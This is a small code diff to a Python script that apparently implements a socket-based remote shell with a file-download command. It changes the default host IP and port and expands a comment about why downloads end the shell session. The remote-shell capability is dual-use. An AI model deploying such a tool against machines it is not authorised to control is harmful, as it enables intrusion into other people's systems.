@@ -15,7 +15,7 @@ from datetime import datetime
 
 
 # Ip address and port to connect to
-HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.174' # Change this to your public ip if you want to use it outside of your local network
+HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.161' # Change this to your public ip if you want to use it outside of your local network
 PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Change the port if you want to but make sure to change it in Client.py as well
 
 
@@ -45,7 +45,7 @@ while True:
         sys.stderr = object
         continue
 
-    # This will close the connection
+    # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
     if cmd.lower() in ['down', 'download']:
         yesNo = s.recv(1024).decode()
         if yesNo == 'y':
